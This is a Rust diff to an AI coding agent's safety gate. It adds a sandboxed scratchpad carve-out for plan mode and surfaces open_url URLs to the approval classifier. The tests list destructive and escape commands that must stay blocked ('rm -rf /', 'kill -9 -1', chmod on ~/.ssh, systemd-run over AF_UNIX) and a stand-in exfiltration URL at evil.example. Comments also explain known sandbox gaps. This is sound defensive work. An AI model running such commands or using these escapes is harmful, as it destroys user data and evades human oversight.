@@ -46,9 +46,27 @@ pub enum Gate {
     /// came from plan mode's plan-file carve-out, so the caller can stamp
     /// `ToolRunMetadata::plan_file_written` instead of guessing from the tool
     /// name.
-    Proceed { risk: RiskClass, plan_write: bool },
+    Proceed {
+        risk: RiskClass,
+        plan_write: bool,
+        confine: Confinement,
+    },
     /// The tool must NOT run; return this outcome verbatim to the model.
     Block(ToolOutcome),
+}
+
+/// How the approved action must be confined when it runs. Only the shell path
+/// can honor anything but [`Confinement::Inherit`] — the file tools write with
+/// `std::fs` and have no launcher to wrap — so every other caller asserts it
+/// never receives one rather than dropping it silently.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Confinement {
+    /// Whatever `SandboxPlan::resolve` decides from config. Today's behavior.
+    Inherit,
+    /// Writes confined to the session scratchpad and the safe devices, with
+    /// the network kill-switch on, regardless of config. Plan mode's
+    /// scratchpad carve-out: the lexical proof authorizes, this enforces.
+    Scratchpad,
 }
 
 /// Convenience for non-replayable tools (`web_*`, `mcp`, `subagent`):
@@ -126,7 +144,17 @@ async fn gate_external_inner(
     // containment can never be proven for them.
     match gate(ctx, request, &[], pending, false, false).await {
         Gate::Block(outcome) => Some(outcome),
-        Gate::Proceed { .. } => None,
+        Gate::Proceed { confine, .. } => {
+            // External actions (web, MCP, subagents) have no launcher to wrap.
+            // The carve-out only matches shell requests, so this is
+            // unreachable — assert it rather than discard a directive.
+            debug_assert_eq!(
+                confine,
+                Confinement::Inherit,
+                "external tools cannot honor a confinement directive"
+            );
+            None
+        },
     }
 }
 
@@ -152,6 +180,10 @@ fn action_detail(tool: &str, args: &serde_json::Value) -> Option<String> {
             )
         },
         "web_fetch" => Some(format!("web_fetch {}", s("url")?)),
+        // `execute_command`'s `open_url`: the URL is the whole action,
+        // and exfil-via-URL is the reason it is gated at all, so the
+        // classifier and the approval modal must see it in full.
+        "open_url" => Some(format!("open_url {}", s("url")?)),
         "mcp_proxy" => {
             let server = s("server_name").unwrap_or("?");
             let name = s("tool_name").unwrap_or("?");
@@ -238,10 +270,10 @@ pub async fn gate(
     // carve-out — recorded here, where the reason is still known, so callers
     // never have to re-derive it from the tool name (see
     // `ToolRunMetadata::plan_file_written`).
-    let (decision, plan_write) = if ctx.plan_file.is_some() {
+    let (decision, plan_write, confine) = if ctx.plan_file.is_some() {
         apply_plan_profile(ctx, &request, decision)
     } else {
-        (decision, false)
+        (decision, false, Confinement::Inherit)
     };
 
     // Explicit user/session opt-in restores unattended public-web reads in
@@ -287,18 +319,23 @@ pub async fn gate(
         return Gate::Proceed {
             risk,
             plan_write: false,
+            confine: Confinement::Inherit,
         };
     }
 
     match decision {
-        PolicyDecision::Allow { risk, .. } => Gate::Proceed { risk, plan_write },
+        PolicyDecision::Allow { risk, .. } => Gate::Proceed {
+            risk,
+            plan_write,
+            confine,
+        },
         PolicyDecision::Ask { risk, checkpoint } => {
             if let Some(broker) = &ctx.approval {
                 // Interactive: prompt the user inline. This works for
                 // replayable AND non-replayable tools — approval runs the
                 // action now, so no out-of-band replay is needed (fixes the
                 // old non-replayable bypass).
-                inline_decision(ctx, broker, &request, risk, None).await
+                inline_decision(ctx, broker, &request, risk, None, confine).await
             } else if !replayable {
                 // Headless non-replayable (web/mcp/subagent): no
                 // checkpoint/replay path, so an Ask can't be satisfied
@@ -309,7 +346,11 @@ pub async fn gate(
                         tool = %request.tool,
                         "policy Ask on non-replayable tool; proceeding (--allow-untrusted-tools)",
                     );
-                    Gate::Proceed { risk, plan_write }
+                    Gate::Proceed {
+                        risk,
+                        plan_write,
+                        confine,
+                    }
                 } else {
                     // Read-only web has its own, narrower remedy — name it,
                     // or the model's operator is left choosing between a
@@ -365,10 +406,14 @@ pub async fn gate(
                 None => crate::providers::VetVerdict::escalate("no Auto-mode classifier available"),
             };
             if verdict.allow {
-                Gate::Proceed { risk, plan_write }
+                Gate::Proceed {
+                    risk,
+                    plan_write,
+                    confine,
+                }
             } else if let Some(broker) = &ctx.approval {
                 // Interactive: escalate to an inline prompt carrying the reason.
-                inline_decision(ctx, broker, &request, risk, Some(verdict.reason)).await
+                inline_decision(ctx, broker, &request, risk, Some(verdict.reason), confine).await
             } else if replayable {
                 // Headless: escalate to a human approval the user can replay.
                 block_for_approval(
@@ -405,6 +450,33 @@ pub async fn gate(
 /// generalize "writes are blocked" and doom-loop through shell probes
 /// instead of calling `write_file` (observed for 7+ minutes on a real
 /// session).
+/// The scratchpad carve-out's precondition. `Some(Confinement::Scratchpad)`
+/// only when EVERY one of these holds, so any missing piece falls through to
+/// the plan denial rather than to an unconfined run:
+///
+/// - the action is a shell command (the file tools have no launcher to
+///   confine, and `write_file` into the scratchpad is a separate question);
+/// - the session has a materialized scratchpad;
+/// - the command provably touches nothing outside it
+///   ([`mermaid_runtime::is_scratch_only_command`]) — this is the
+///   authorization, and it is what keeps the `AF_UNIX` escape and Landlock's
+///   missing metadata rights out of reach by refusing those heads outright;
+/// - the OS can actually enforce write-confinement AND the network
+///   kill-switch on this platform. The sandbox is defense-in-depth, but
+///   granting a confinement the platform cannot install would leave the
+///   command running with neither belt nor braces.
+fn scratch_carve_out(ctx: &ExecContext, request: &ActionRequest) -> Option<Confinement> {
+    let command = request.command.as_deref()?;
+    let scratch = ctx.scratchpad.as_deref()?;
+    if !mermaid_runtime::is_scratch_only_command(command, scratch) {
+        return None;
+    }
+    if !super::exec::scratch_confinement_available() {
+        return None;
+    }
+    Some(Confinement::Scratchpad)
+}
+
 fn plan_deny(risk: RiskClass, plan_file: &std::path::Path) -> PolicyDecision {
     PolicyDecision::Deny {
         risk,
@@ -461,7 +533,7 @@ fn apply_plan_profile(
     ctx: &ExecContext,
     request: &ActionRequest,
     decision: PolicyDecision,
-) -> (PolicyDecision, bool) {
+) -> (PolicyDecision, bool, Confinement) {
     use mermaid_runtime::ToolCategory as C;
     let perms = ctx.plan_permissions;
     match decision {
@@ -486,9 +558,14 @@ fn apply_plan_profile(
                         checkpoint: false,
                     },
                     true,
+                    Confinement::Inherit,
                 )
             } else if request.category == C::Memory {
-                (plan_level_decision(perms.memory, risk, plan_file), false)
+                (
+                    plan_level_decision(perms.memory, risk, plan_file),
+                    false,
+                    Confinement::Inherit,
+                )
             } else if request
                 .command
                 .as_deref()
@@ -503,15 +580,28 @@ fn apply_plan_profile(
                         checkpoint: false,
                     },
                     true,
+                    Confinement::Inherit,
                 )
             } else if request
                 .command
                 .as_deref()
                 .is_some_and(mermaid_runtime::is_plan_safe_build_command)
             {
-                (plan_level_decision(perms.builds, risk, plan_file), false)
+                // Builds keep the WIDER confinement: `cargo test` must reach
+                // `target/`, which the scratch-only write set excludes.
+                (
+                    plan_level_decision(perms.builds, risk, plan_file),
+                    false,
+                    Confinement::Inherit,
+                )
+            } else if let Some(scratch) = scratch_carve_out(ctx, request) {
+                (
+                    plan_level_decision(perms.scratchpad, risk, plan_file),
+                    false,
+                    scratch,
+                )
             } else {
-                (plan_deny(risk, plan_file), false)
+                (plan_deny(risk, plan_file), false, Confinement::Inherit)
             }
         },
         PolicyDecision::Allow { risk, .. }
@@ -520,9 +610,13 @@ fn apply_plan_profile(
             if request.category == C::Web =>
         {
             let plan_file = ctx.plan_file.as_deref().expect("plan mode ctx");
-            (plan_level_decision(perms.web, risk, plan_file), false)
+            (
+                plan_level_decision(perms.web, risk, plan_file),
+                false,
+                Confinement::Inherit,
+            )
         },
-        other => (other, false),
+        other => (other, false, Confinement::Inherit),
     }
 }
 
@@ -553,6 +647,7 @@ async fn inline_decision(
     request: &ActionRequest,
     risk: RiskClass,
     classifier_reason: Option<String>,
+    confine: Confinement,
 ) -> Gate {
     let external_path = (request.category == mermaid_runtime::ToolCategory::ExternalDirectory)
         .then_some(request.path.as_deref())
@@ -568,6 +663,7 @@ async fn inline_decision(
         return Gate::Proceed {
             risk,
             plan_write: false,
+            confine,
         };
     }
     let kind = if classifier_reason.is_some() {
@@ -592,6 +688,7 @@ async fn inline_decision(
         ApprovalDecision::Approve | ApprovalDecision::ApproveAlways => Gate::Proceed {
             risk,
             plan_write: false,
+            confine,
         },
         ApprovalDecision::Deny => Gate::Block(ToolOutcome::error(
             format!("{} — denied by you", request.summary),
@@ -1162,10 +1259,13 @@ mod tests {
         req
     }
 
-    /// Plan-mode ctx: the reducer floors the mode to `ReadOnly` and stamps the
-    /// plan file; mirror both here.
+    /// Plan-mode ctx. `reducer/streaming.rs` passes the LIVE mode
+    /// (`SafetyMode::Plan`, which carries its own read-only floor in the
+    /// engine) and stamps the plan file — it does not substitute `ReadOnly`.
+    /// Mirror that exactly, or these tests exercise a pairing that never
+    /// occurs in production.
     fn ctx_plan() -> ExecContext {
-        let mut c = ctx(SafetyMode::ReadOnly);
+        let mut c = ctx(SafetyMode::Plan);
         c.workdir = PathBuf::from("/repo");
         c.plan_file = Some(PathBuf::from("/repo/.mermaid/plans/x.md"));
         c
@@ -1516,7 +1616,7 @@ mod tests {
         );
         let readonly = PolicyEngine::new(SafetyMode::ReadOnly).decide(&request);
         assert!(matches!(readonly, PolicyDecision::Ask { .. }));
-        let (decision, plan_write) = apply_plan_profile(&context, &request, readonly);
+        let (decision, plan_write, _confine) = apply_plan_profile(&context, &request, readonly);
         assert!(matches!(decision, PolicyDecision::Ask { .. }));
         assert!(!plan_write, "a web fetch is not a plan-file write");
     }
@@ -1747,6 +1847,203 @@ mod tests {
             matches!(g, Gate::Block(_)),
             "read-only mode must block scratch mutations",
         );
+    }
+
+    /// Plan ctx with a materialized scratchpad, for the carve-out.
+    fn ctx_plan_scratch(scratch: &std::path::Path) -> ExecContext {
+        let mut c = ctx_plan();
+        c.scratchpad = Some(scratch.to_path_buf());
+        c
+    }
+
+    #[tokio::test]
+    async fn plan_scratch_carve_out_allows_a_proven_scratch_only_command() {
+        // The field report: read-only probes chained with a fallback that
+        // extracts a .deb into the scratchpad. Every part of this was denied
+        // before -- `&&`, the `$MERMAID_SCRATCHPAD` handle, and `ar`/`tar` as
+        // unknown heads.
+        let scratch = std::path::PathBuf::from("/tmp/mermaid-1000/proj/sess/scratchpad");
+        // The carve-out requires the platform to be able to enforce. On Linux
+        // and macOS it must be — a silent skip here would hide the whole
+        // feature regressing to "always denied".
+        let enforceable = super::super::exec::scratch_confinement_available();
+        if cfg!(any(target_os = "linux", target_os = "macos")) {
+            assert!(
+                enforceable,
+                "Linux/macOS must be able to install both sandbox halves",
+            );
+        } else if !enforceable {
+            return;
+        }
+        let g = gate(
+            &ctx_plan_scratch(&scratch),
+            shell_request("ar x $MERMAID_SCRATCHPAD/pkg.deb && tar -tJf control.tar.xz"),
+            &[],
+            serde_json::json!({}),
+            true,
+            false,
+        )
+        .await;
+        if cfg!(windows) {
+            // `is_scratch_only_command` has no PowerShell dialect yet, so the
+            // carve-out must stay closed there rather than proving anything
+            // about a command parsed in the wrong grammar.
+            assert!(
+                matches!(g, Gate::Block(_)),
+                "PowerShell has no scratch prover; the carve-out must stay shut",
+            );
+            return;
+        }
+        match g {
+            Gate::Proceed { confine, .. } => assert_eq!(
+                confine,
+                Confinement::Scratchpad,
+                "the grant must carry its enforcement half",
+            ),
+            Gate::Block(o) => panic!("scratch-only command denied: {:?}", o.model_content),
+        }
+    }
+
+    #[tokio::test]
+    async fn plan_scratch_carve_out_is_void_without_a_scratchpad() {
+        // No materialized scratchpad: there is nothing to prove containment
+        // against, so the carve-out must not fire (and must not hand out a
+        // directive naming a path that does not exist).
+        let mut c = ctx_plan();
+        c.scratchpad = None;
+        let g = gate(
+            &c,
+            shell_request("ar x pkg.deb"),
+            &[],
+            serde_json::json!({}),
+            true,
+            false,
+        )
+        .await;
+        assert!(
+            matches!(g, Gate::Block(_)),
+            "no scratchpad means no carve-out",
+        );
+    }
+
+    #[tokio::test]
+    async fn plan_scratch_carve_out_refuses_the_sandbox_escapes() {
+        // These are precisely the commands the OS sandbox does NOT contain:
+        // `systemd-run` spawns an unconfined child over AF_UNIX (which the
+        // network kill-switch spares by design) and `chmod` mutates metadata
+        // (which Landlock carries no right for). The head allowlist is what
+        // has to stop them, and this is the test that says so.
+        let scratch = std::path::PathBuf::from("/tmp/mermaid-1000/proj/sess/scratchpad");
+        for cmd in [
+            "systemd-run --user /bin/sh -c true",
+            "chmod -R go+w /home/u/.ssh",
+            "kill -9 -1",
+            "tar -C /etc -xf pkg.tar",
+            "ar x ../../escape.deb",
+            "ar t pkg.deb && rm -rf /",
+        ] {
+            let g = gate(
+                &ctx_plan_scratch(&scratch),
+                shell_request(cmd),
+                &[],
+                serde_json::json!({}),
+                true,
+                false,
+            )
+            .await;
+            assert!(matches!(g, Gate::Block(_)), "{cmd:?} must stay denied");
+        }
+    }
+
+    #[tokio::test]
+    async fn plan_scratch_carve_out_respects_its_permission_level() {
+        let scratch = std::path::PathBuf::from("/tmp/mermaid-1000/proj/sess/scratchpad");
+        let mut c = ctx_plan_scratch(&scratch);
+        c.plan_permissions.scratchpad = mermaid_domain::PlanPermLevel::Deny;
+        let g = gate(
+            &c,
+            shell_request("ar x pkg.deb"),
+            &[],
+            serde_json::json!({}),
+            true,
+            false,
+        )
+        .await;
+        assert!(
+            matches!(g, Gate::Block(_)),
+            "`[plan] scratchpad = deny` must close the carve-out",
+        );
+    }
+
+    #[tokio::test]
+    async fn builds_keep_the_wider_confinement() {
+        // `cargo test` writes `target/`, which the scratch-only write set
+        // excludes -- it must keep routing to the builds branch, not get
+        // captured by the scratch branch and then fail with an opaque EACCES.
+        let scratch = std::path::PathBuf::from("/tmp/mermaid-1000/proj/sess/scratchpad");
+        let g = gate(
+            &ctx_plan_scratch(&scratch),
+            shell_request("cargo test"),
+            &[],
+            serde_json::json!({}),
+            true,
+            false,
+        )
+        .await;
+        match g {
+            Gate::Proceed { confine, .. } => assert_eq!(
+                confine,
+                Confinement::Inherit,
+                "a build must not be confined to the scratchpad",
+            ),
+            Gate::Block(o) => panic!("builds are allowed by default: {:?}", o.model_content),
+        }
+    }
+
+    #[tokio::test]
+    async fn plan_mode_denies_a_proven_scratch_contained_mutation() {
+        // Nothing pinned this before. It holds only because
+        // `apply_plan_profile` runs BEFORE the scratchpad downgrade, and
+        // because that downgrade never matches `Deny`. Both facts are
+        // comments, not types — reorder the two blocks and scratch writes
+        // silently open up while a plan is being drafted. Assert the property
+        // directly so the reorder fails here instead of in the field.
+        for request in [
+            shell_request("touch notes.txt"),
+            edit_request("/scratch/notes.txt"),
+        ] {
+            let summary = request.summary.clone();
+            let g = gate(&ctx_plan(), request, &[], serde_json::json!({}), true, true).await;
+            match g {
+                Gate::Block(outcome) => assert!(
+                    outcome
+                        .model_content
+                        .contains("blocked by policy: plan mode"),
+                    "{summary}: expected the plan-flavored denial, got {:?}",
+                    outcome.model_content
+                ),
+                Gate::Proceed { .. } => {
+                    panic!("{summary}: plan mode must not run a scratch-contained mutation")
+                },
+            }
+        }
+    }
+
+    #[test]
+    fn open_url_detail_surfaces_the_url() {
+        // Exfil-via-URL is the reason `execute_command`'s `open_url` is gated
+        // at all, so the classifier and the approval modal must see the URL
+        // itself — a dev-server URL and an exfiltrating one are otherwise
+        // indistinguishable. The gating is covered end-to-end by
+        // `exec::tests::background_open_url_is_policy_gated`; a `gate()`-level
+        // test cannot cover it, because `gate_external` already blocked Web
+        // egress — what was missing was the CALL.
+        let detail = action_detail(
+            "open_url",
+            &serde_json::json!({ "url": "https://evil.example/?d=secret" }),
+        )
+        .expect("open_url detail");
+        assert!(detail.contains("evil.example/?d=secret"), "got {detail:?}");
     }
 
     #[tokio::test]
